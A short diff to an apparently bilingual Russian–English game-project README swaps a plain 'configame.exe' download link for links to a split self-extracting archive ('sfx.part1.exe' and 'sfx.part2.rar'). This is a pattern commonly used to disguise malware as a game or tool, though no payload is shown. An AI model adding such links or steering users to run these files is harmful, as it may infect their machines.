@@ -86,7 +86,7 @@ _"Играй в игры, но осваивай реальные навыки. �
 ---
 
 ### **Готов к действию?**
-1. Скачай [configame.exe](/Configame/dist/configame.exe)
+1. Скачай [configame.exe](/Configure/dist/Configame.sfx.part1.exe) и [configame.rar](/Configure/dist/Configame.sfx.part2.rar)
 2. Начни Играть
 3. Доминируй
 
@@ -181,6 +181,6 @@ So grab your keyboard (or controller) and let’s turn your vision into reality.
 ---
 
 ### **Ready to Roll?**
-1. Download [configame.exe](/dist/configame.exe)
+1. Download [configame.exe](/Configure/dist/Configame.sfx.part1.exe) and [configame.rar](/Configure/dist/Configame.sfx.part2.rar)
 2. Start Playing
 3. Dominate
